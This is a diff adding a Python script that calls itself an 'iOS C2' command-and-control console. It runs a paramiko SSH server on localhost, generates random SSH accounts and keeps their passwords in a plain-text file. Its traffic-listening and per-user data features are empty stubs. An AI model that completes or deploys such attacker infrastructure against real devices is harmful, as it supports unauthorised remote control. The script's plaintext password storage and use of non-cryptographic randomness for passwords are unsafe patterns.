@@ -1,0 +1,172 @@
+import os
+import sys
+import time
+import string
+import random
+import threading
+from pathlib import Path
+from paramiko import ServerInterface, RSAKey, Transport
+from socketserver import ThreadingTCPServer, BaseRequestHandler
+
+import paramiko
+
+
+class CustomSSHServerInterface(ServerInterface):
+
+    def check_auth_password(self, username, password):
+        user_table = read_user_table()
+        if username in user_table and user_table[username] == password:
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+
+    def get_allowed_auths(self, username):
+        return 'password'
+
+
+class SSHRequestHandler(BaseRequestHandler):
+    def handle(self):
+        try:
+            transport = Transport(self.request)
+            transport.add_server_key(host_key)
+            transport.start_server(server=CustomSSHServerInterface())
+            channel = transport.accept()
+        except Exception as e:
+            print(f"Error: {e}")
+
+
+def read_user_table():
+    user_table_file = Path("C:/Users/glenn/Desktop/iOS/C2/user_table.txt")
+    user_table = {}
+
+    if user_table_file.exists():
+        with open(user_table_file, "r") as f:
+            for line in f.readlines():
+                username, password = line.strip().split(":", 1)
+                user_table[username] = password
+    return user_table
+
+
+def write_user_table(user_table):
+    user_table_file = Path("C:/Users/glenn/Desktop/iOS/C2/user_table.txt")
+
+    with open(user_table_file, "w") as f:
+        for username, password in user_table.items():
+            f.write(f"{username}:{password}\n")
+
+
+def generate_random_string(length, charset):
+    return "".join(random.choice(charset) for _ in range(length))
+
+
+def create_ssh_user():
+    charset = string.ascii_letters + string.digits
+    username = generate_random_string(12, charset)
+    password = generate_random_string(64, charset)
+    user_table = read_user_table()
+    user_table[username] = password
+    write_user_table(user_table)
+    return username, password
+
+
+def list_users():
+    user_table = read_user_table()
+    return list(user_table.items())
+
+
+def clear_screen():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+
+def main():
+    global host_key
+    host_key = RSAKey.generate(bits=2048)
+
+    server_address = ("localhost", 22)
+    ssh_server = ThreadingTCPServer(server_address, SSHRequestHandler)
+    ssh_server_thread = threading.Thread(target=ssh_server.serve_forever)
+    ssh_server_thread.daemon = True
+    ssh_server_thread.start()
+
+    while True:
+        clear_screen()
+        print(""" 
+               ▌▄▄▄   ▄▄▄▄▄▄▄▄▄▄   ▄▄▌            
+                ▄ ███ ▀████████▌ ███ ▄             
+             ▄██▀ ███▌          ▐███ ▀██▄          
+           ▄██▀ ▄███▀ ▄████████▄ ▀███▄ ▀██▄       
+         ▄███▀ ████ ▄████████████▄ ████ ▐███▄      
+        ████▀ ████▌ ▀▀           ▀▀ ▐████ ▀████    
+       ████   ██████▄▄██████████▄▄██████   ████   
+      ████  █▌ ▀█████████▀▀▀▀█████████▀ ▄█  ████   
+     ████  ▄███  ▐████▀        ▀████▌  ███▌  ███▌  
+     ███▌  ███▌  ████            ████  ████  ████  
+     ███▌  ███▌  ███▌            ▐███  ▐███  ████  
+     ███▌  ███▌  ████            ████  ████  ████  
+     ████  ▀███   ████▄        ▄███████▄▀█▌  ███▌  
+      ████  ████▄  ▀█████▄▄▄▄█████▀ ████ ▀  ████   
+       ████  ▀████▄  ▀▀████████▀▀  ▄████   ████   
+        ████▄  ▀████▄▄          ▄▄████▀  ▄████    
+         ▀████▄  ▀██████████████████▀  ▄████▀      
+           ▀████▄    ▀▀▀██████▀▀▀   ▄▄████▀       
+             ▀▀  ▄▀           ▄▄▄███████▀          
+              ▄███▄█████████████████▀             
+             █████████▀▀▀▀▀▀▀▀▀▀                  
+            ████████▄                              
+           ██▀                                    
+                           
+             """)
+        print("       ")
+        print("iOS C2 Beta 2")
+        print("1. SSH user generation")
+        print("2. Display users and passwords")
+        print("3. User management")
+        print("4. Listen for incoming traffic")
+        print("0. Exit")
+
+        choice = input("Enter your choice: ")
+
+        if choice == "1":
+            username, password = create_ssh_user()
+            print(f"\nGenerated SSH user:\nUsername: {username}\nPassword: {password}")
+            input("\nPress Enter to continue...")
+
+        elif choice == "2":
+            print("\nUsers and passwords:")
+            for username, password in list_users():
+                print(f"Username: {username}\nPassword: {password}\n")
+            input("\nPress Enter to continue...")
+
+        elif choice == "3":
+            while True:
+                clear_screen()
+                print("\nUser management:")
+                users = list_users()
+                for i, (username, _) in enumerate(users, start=1):
+                    print(f"{i}. {username}")
+
+                print("0. Back")
+                choice = input("Enter your choice: ")
+
+                if choice == "0":
+                    break
+
+                index = int(choice) - 1
+                if 0 <= index < len(users):
+                    username, _ = users[index]
+                    print(f"\nData sent by user {username}:")
+        elif choice == "4":
+            print("Listening for incoming traffic...")
+            print("Type 'back' to return to the main menu.")
+            while True:
+                command = input()
+                if command.lower() == "back":
+                    break
+
+        elif choice == "0":
+            break
+        
+if __name__ == "__main__":
+    main()
